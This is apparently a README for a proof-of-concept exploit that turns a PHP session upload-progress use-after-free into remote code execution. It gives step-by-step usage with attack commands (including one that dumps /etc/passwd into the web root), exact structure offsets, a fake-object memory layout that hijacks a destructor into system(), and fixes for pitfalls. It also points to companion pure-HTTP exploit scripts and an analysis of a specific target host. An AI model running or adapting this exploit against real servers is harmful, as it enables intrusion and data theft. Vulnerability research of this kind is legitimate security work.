# CVE-2026-109619 — PHP Session Upload Progress UAF → RCE

GDB 輔助概念驗證（Proof of Concept），利用 PHP Session Upload Progress 的
Use-After-Free 漏洞達成遠端程式碼執行。

## 漏洞概述

PHP 的 `session.upload_progress` 機制在處理 multipart 請求時，若 producer 請求
因 OOM（記憶體耗盡）中斷，`PS(http_session_vars)` 中的 `zend_reference` 會殘留
為 stale 指標。後續 consumer 請求透過 `session.upload_progress.cleanup=On` 觸發
`php_session_track_init`，對 stale 指標執行 `zval_ptr_dtor`，形成 UAF。

透過在 GDB 斷點處注入精心構造的記憶體佈局，可將 `zval_ptr_dtor` 的呼叫鏈導向
`zif_system`，最終執行任意指令。

## 環境需求

### PHP 版本

- **已驗證**: PHP 8.4.26（Debian/Ubuntu 套件，含 debug symbols）
- **理論適用**: PHP 8.1+ 任何具有 `session.upload_progress` 的版本
  （結構偏移量可能因版本不同需調整）

### php.ini 必要設定

```ini
session.upload_progress.enabled = On    ; 啟用上傳進度追蹤
session.upload_progress.cleanup = On    ; 關鍵：cleanup=On 才會觸發 track_init 的 zval_ptr_dtor
session.use_only_cookies = 0            ; 允許 form field 傳遞 PHPSESSID
memory_limit = 8M                       ; 低記憶體限制使 12MB payload 觸發 OOM
```

> `session.upload_progress.cleanup = On` 是 **觸發條件**，不是阻擋條件。
> 只有 cleanup=On 時 `MULTIPART_EVENT_END` 才會呼叫 `php_session_rfc1867_cleanup`
> → `php_session_initialize` → `php_session_track_init` → `zval_ptr_dtor` 觸發鏈。

### Apache 設定

```
# /etc/apache2/mods-enabled/mpm_prefork.conf
MaxRequestWorkers 1          # 單一 worker — 確保 producer/consumer 命中同一 process
```

- 必須使用 **prefork MPM**（非 event/worker）
- 單一 worker 確保兩次請求落在同一 process，stale 指標才能被 consumer 觸及

### 攻擊端需求

| 工具      | 用途                                       |
|-----------|------------------------------------------|
| Python 3  | HTTP multipart 建構、GDB 腳本產生           |
| sshpass   | 自動化 SSH/SCP 密碼輸入                     |
| GDB       | **目標機上**需安裝，用於位址解析與 payload 寫入 |
| debug symbols | 目標 PHP 需有 `php-dbg` 或 debug symbols 套件 |

安裝：

```bash
# 攻擊端 (macOS)
brew install esolitos/ipa/sshpass

# 目標端 (Debian/Ubuntu)
apt install gdb php8.4-dbg      # 或對應版本的 debug symbols
```

## 使用方式

### 基本用法

```bash
./php2shell-poc.sh
```

預設連線 `127.0.0.1`（透過環境變數設定目標），執行 `id > /var/www/html/pwn.txt`。

### 自訂參數

```bash
./php2shell-poc.sh \
  --host 10.0.0.1 \
  --port 80 \
  --ssh-user myuser \
  --ssh-pass mypass \
  --cmd 'cat /etc/passwd > /var/www/html/out.txt' \
  --outfile /var/www/html/out.txt
```

### 所有參數

| 參數           | 預設值                        | 說明                        |
|----------------|-----------------------------|-----------------------------|
| `--host`       | `127.0.0.1`                 | 目標 IP                     |
| `--port`       | `80`                        | HTTP port                   |
| `--ssh-user`   | (env `SSH_USER`)            | SSH 使用者                   |
| `--ssh-pass`   | (env `SSH_PASS`)            | SSH 密碼（同時用於 sudo）     |
| `--cmd`        | `id>/var/www/html/pwn.txt`  | 要執行的指令                  |
| `--outfile`    | `/var/www/html/pwn.txt`     | 驗證用的輸出檔路徑             |
| `--session-id` | `attacksid00001`            | PHP session ID               |

## 攻擊流程（6 階段）

```
┌─────────────┐     ┌──────────────┐     ┌──────────────┐
│  1. Restart  │────>│ 2. Producer  │────>│ 3. GDB Read  │
│   Apache     │     │   OOM        │     │   Addresses  │
└─────────────┘     └──────────────┘     └──────┬───────┘
                                                 │
┌─────────────┐     ┌──────────────┐     ┌──────▼───────┐
│  6. Check   │<────│ 5. Consumer  │<────│ 4. GDB       │
│   Result    │     │   Trigger    │     │   Breakpoint  │
└─────────────┘     └──────────────┘     └──────────────┘
```

### Stage 1 — 重啟 Apache

重啟確保乾淨狀態。取得唯一 worker PID。

### Stage 2 — Producer（OOM 觸發）

發送 multipart 請求：
- `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS` 欄位（啟用 session progress tracking）
- 一個小檔案（觸發 `FILE_START` → `php_rinit_session(1)`）
- 12MB `big` 欄位 → 超過 `memory_limit=8M` → `zend_bailout()`

OOM 中斷後：
- `zend_mm_shutdown(full=0)` 回收 ZendMM 記憶體
- 但 `PS(http_session_vars)` 未被清除 → 殘留 stale `zend_reference` 指標

### Stage 3 — GDB 讀取位址

透過 GDB attach 到 worker process，讀取四個關鍵位址（詳見下方「記憶體位址」章節）。

### Stage 4 — GDB 斷點腳本

上傳 GDB batch script 到目標，設定 `php_session_track_init` 斷點。
斷點命中時才寫入 payload（避免 consumer 的 ZMM 分配覆蓋 payload）。

### Stage 5 — Consumer 觸發

發送 **僅含表單欄位**（無檔案上傳）的 multipart 請求：
- `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS`（啟用 progress tracking）
- 填充欄位（padding）

因為沒有 `FILE_START` 事件，`php_rinit_session(0)` **不會被呼叫**，
stale `IS_REFERENCE` 在 `PS(http_session_vars)` 中保留。

`MULTIPART_EVENT_END` → `php_session_rfc1867_cleanup` → `php_session_initialize`
→ `php_session_track_init` → **breakpoint 命中** → GDB 寫入 payload → continue
→ `zval_ptr_dtor(stale ref)` → 攻擊鏈觸發。

### Stage 6 — 驗證結果

讀取指令輸出檔，確認 RCE 是否成功。

## 記憶體位址解析

本 PoC 需要四個位址，全部透過 GDB 從 worker process 動態讀取（ASLR 下每次重啟
Apache 位址都會改變）：

### 1. `ps_globals`（session 全域結構）

```
(gdb) printf "%p", &ps_globals
0x7f1234df660
```

- PHP session 子系統的全域狀態結構
- 來自 `ext/session/session.c` 中的 `ZEND_BEGIN_MODULE_GLOBALS(ps)`
- 含有 `http_session_vars`、`session_status`、`id` 等成員
- **尋找方式**: 需要 debug symbols（`php-dbg` 套件），GDB 直接解析符號

### 2. `zif_system`（system() 的 C 實作）

```
(gdb) info address zif_system
Symbol "zif_system" is at 0x7f12345590a0 in a file compiled without debugging.
```

- PHP `system()` 函數對應的 C handler
- 簽名: `void zif_system(zend_execute_data *ed, zval *return_value)`
- 內部呼叫 `php_exec_ex(EXEC_NORMAL)` → `popen(cmd, "r")`
- **尋找方式**: debug symbols 或 `nm -D libphp.so | grep zif_system`
- **替代**: 若無 symbols，可透過 libphp.so 基址 + 相對偏移（0x4590A0 for PHP 8.4.26）

### 3. `http_session_vars`（stale 指標所在位置）

```
http_session_vars = ps_globals + 0x168
```

- 固定偏移: `PS(http_session_vars)` 在 `ps_globals` 結構中位於 offset **0x168**
  （PHP 8.4.26，其他版本需驗證）
- 型別: `zval`（16 bytes: value 8B + type_info 4B + u2 4B）
- **驗證偏移**: `(gdb) print &((php_ps_globals*)0)->http_session_vars`

### 4. `stale ref address`（殘留的 zend_reference 地址）

```
(gdb) printf "0x%lx", *(unsigned long *)<http_session_vars_addr>
0x7f1234e58230
```

- 讀取 `http_session_vars` zval 的 `.value` 欄位（第一個 8 bytes）
- 這是 producer OOM 後殘留的 `zend_reference*`
- **型別驗證**: `((unsigned int *)<hsv_addr>)[2]` 應為 `0x10a`（IS_REFERENCE=0xa + flags）

### 偏移量速查

```
ps_globals 結構:
  +0x168  http_session_vars (zval)

zend_reference (32B, bin-32):
  +0x00  gc.refcount (4B) + gc.type_info (4B)
  +0x08  val.value (8B) → 指向 zend_array
  +0x10  val.u1.type_info (4B) + val.u2 (4B)
  +0x18  sources (8B)

_zend_array / HashTable (56B):
  +0x00  gc (8B)
  +0x08  u.flags (4B) + nTableMask (4B)
  +0x10  arData (8B) → Bucket 陣列
  +0x18  nNumUsed (4B) + nNumOfElements (4B)
  +0x20  nTableSize (4B) + nInternalPointer (4B)
  +0x28  nNextFreeElement (8B)
  +0x30  pDestructor (8B) ← 替換為 zif_system

zend_execute_data (80B):
  +0x00  opline (8B)
  +0x08  call (8B)
  +0x10  return_value (8B)
  +0x18  func (8B)
  +0x2C  This.u2.num_args (4B) ← 設為 1
  +0x50  arg1 (zval 16B) ← value → zend_string, type = IS_STRING

Bucket (32B):
  +0x00  val (zval 16B)    ← pDestructor 接收 &val
  +0x10  h (8B)
  +0x18  key (8B)

zend_string:
  +0x00  gc (8B)
  +0x08  h (8B)
  +0x10  len (8B)
  +0x18  val[] ← 指令字串 + NUL terminator
```

## Payload 記憶體佈局

所有假結構放在 stale reference 附近的已釋放 ZMM 區域：

```
ref_addr + 0x00  ┌─ zend_reference (patched) ─┐
                 │ gc.rc=1, type=IS_REFERENCE  │
                 │ val.value → HT (ref+0x40)   │
                 │ val.type = IS_ARRAY (0x307)  │
                 └─────────────────────────────┘

ref_addr + 0x40  ┌─ fake HashTable (56B) ──────┐
                 │ gc.rc=1, type=IS_ARRAY       │
                 │ arData → ED (ref+0x80)       │
                 │ nNumUsed=1, nNumOfElements=1  │
                 │ pDestructor = zif_system      │ ← 關鍵
                 └──────────────────────────────┘

ref_addr + 0x80  ┌─ fake Bucket[0] / execute_data ─┐
                 │ val.type = IS_NULL (≠ UNDEF!)    │ ← pDestructor 不跳過
                 │ num_args = 1                      │
                 │ arg1.value → STR (ref+0x100)      │
                 │ arg1.type = IS_STRING             │
                 └───────────────────────────────────┘

ref_addr + 0x100 ┌─ fake zend_string ──────────┐
                 │ gc, hash, len               │
                 │ val = "id>/var/www/html/..." │
                 │ + NUL terminator             │ ← strlen 必須等於 len
                 └─────────────────────────────┘
```

## 攻擊鏈（Call Chain）

```
zval_ptr_dtor(&PS(http_session_vars))          ← stale zval
  → rc_dtor_func(ref, IS_REFERENCE)
    → zend_reference_destroy(ref)
      → i_zval_ptr_dtor(&ref->val, IS_ARRAY)
        → rc_dtor_func(ht)
          → zend_array_destroy(ht)
            → pDestructor(&bucket[0].val)      ← pDestructor = zif_system
              → zif_system(fake_execute_data)
                → php_exec_ex(EXEC_NORMAL)
                  → popen("id>/var/www/html/pwn.txt", "r")
                    → /bin/sh -c "id>/var/www/html/pwn.txt"
                      → uid=33(www-data)       ← RCE!
```

> **注意**: `zif_system` 的 `return_value`（rsi）為無效指標，`popen` 執行後
> 在 `RETVAL_STRINGL` 時觸發 SIGSEGV。但此時指令已執行完成，RCE 成功。

## 關鍵發現與陷阱

### 1. `cleanup=On` 是觸發條件（非阻擋條件）

先前分析錯誤地認為 cleanup=On 會阻擋攻擊。實際上：
- cleanup=On → `MULTIPART_EVENT_END` 觸發清理 → 呼叫 `php_session_track_init`
- cleanup=Off → **不會觸發 track_init**，`zval_ptr_dtor` 無法執行

### 2. Consumer 必須**不**上傳檔案

- Consumer 只發送表單欄位，不含 `filename` 的 part
- 若有 `FILE_START` 事件 → `php_rinit_session(0)` 被呼叫 → stale 指標被清除
- 沒有 `FILE_START` → `php_rinit_session` 不呼叫 → stale IS_REFERENCE 保留

### 3. Bucket type 不能是 IS_UNDEF

- `zend_array_destroy` 檢查 `Z_TYPE(bucket.val) != IS_UNDEF` 才呼叫 pDestructor
- Toolkit 原始碼設定 `execute_data.call = 0`，對應 `bucket.val.u1.type_info = 0`（IS_UNDEF）
- 修正: 設為 IS_NULL (1)

### 4. NUL terminator 必不可少

- `zif_system` 檢查 `strlen(cmd) == cmd_len`
- 若指令字串長度恰好是 8 的倍數，`ljust(8, b'\x00')` 不會新增結尾 NUL
- 必須明確寫入 `\0`：`set {char}(STR+24+len) = 0`

### 5. IS_ARRAY type_info 必須是 0x307（非 0xC07）

- `val.u1.type_info` 用於 refcounting 檢查
- `0x307`: type=7 (IS_ARRAY), flags=0x03 → bit 0 = 1 (IS_TYPE_REFCOUNTED) ✓
- `0xC07`: flags=0x0C → bit 0 = 0 → 不被視為 refcounted → 鏈不觸發

### 6. Payload 必須在斷點時寫入

- Consumer 的表單欄位分配（`zend_string` for field names/values）會重用 freed ZMM pages
- 若 payload 在 consumer 請求前寫入，consumer 的分配會覆蓋 payload
- 解法: 在 `php_session_track_init` 斷點時寫入（此時所有 ZMM 分配已完成）

### 7. PrivateTmp=yes

- 若 Apache 使用 systemd 且 `PrivateTmp=yes`，`/tmp` 是私有的
- 指令輸出必須寫到 web root（如 `/var/www/html/`）而非 `/tmp`

## post_max_size 與 memory_limit 的關係

OOM 觸發的**必要條件**：

```
post_max_size ≥ memory_limit
```

| 設定 | 預設值 | OOM 可否觸發 |
|------|--------|:----------:|
| `post_max_size=8M`, `memory_limit=128M` | PHP 預設 | ✗ 不可能 |
| `post_max_size=256M`, `memory_limit=128M` | 手動調高 post_max_size | ✓ |
| `post_max_size=8M`, `memory_limit=8M` | .htaccess 降低 memory_limit | ✓ |

**原理**：PHP 在 `sapi_read_post_data()` 階段處理 POST body，但最多只處理
`post_max_size` 大小的資料。若 `post_max_size < memory_limit`，無論攻擊者
傳送多大的 body，PHP 分配的記憶體永遠不會超過 `memory_limit`，OOM 無法觸發。

### 現實場景的兩種利用方式

1. **管理員調高 post_max_size**（如 WordPress 大檔案上傳）→ 直接 OOM
2. **AllowOverride All + .htaccess 寫入權限** → 用 `php_value memory_limit 8M`
   降低 memory_limit，同時調高 `post_max_size` → OOM

## 環境變數

所有腳本使用環境變數取代硬編碼的主機資訊：

| 變數 | 預設值 | 說明 |
|------|--------|------|
| `TARGET_HOST` | `127.0.0.1` | 目標 IP 或主機名稱 |
| `TARGET_PORT` | `80` 或 `443` | HTTP/HTTPS port |
| `SSH_USER` | `user` | SSH 使用者（需 sudo 權限） |
| `SSH_PASS` | `pass` | SSH 密碼 |

使用範例：

```bash
TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 exploit_112.py
TARGET_HOST=10.0.0.1 SSH_USER=admin SSH_PASS=secret python3 http_rce.py
```

## 檔案結構

```
├── exploit.py              ← GDB 輔助完整 exploit（需 SSH + debug symbols）
├── exploit_112.py           ← 純 HTTP RCE（OOM + LFI，無需 SSH）
├── http_rce.py              ← HTTP RCE + SSH 輔助（lab-tuned php.ini）
├── http_rce_default.py      ← HTTP RCE（stock php.ini + .htaccess override）
├── test_oom_112.py          ← 獨立 OOM 觸發測試
├── README.md                ← 本文件
├── RESULTS.md               ← 實機測試結果
├── cve-2026-98432-result.md ← CVE-2026-98432 核心 UAF 驗證結果
├── target-112-analysis.md   ← 攻擊面分析（CentOS + WordPress）
└── rce-chain-design-*.md    ← RCE 鏈路設計文件
```

## 限制

- **GDB 版本 (`exploit.py`)**: 需要 SSH + sudo + debug symbols，非純 HTTP
- **LFI 版本 (`exploit_112.py`)**: 需要目標存在 LFI 向量（如 reader.php）
- **.htaccess 版本 (`http_rce_default.py`)**: 需要 Apache AllowOverride All 且有 SSH 權限
- **單一 worker**: prefork MPM + `MaxRequestWorkers 1`（GDB 版本必要）
- **ASLR**: GDB 版本每次 Apache 重啟後需重新解析位址

純 HTTP 版本（不依賴 GDB/SSH）需另行實現 heap leak 與 libphp leak。
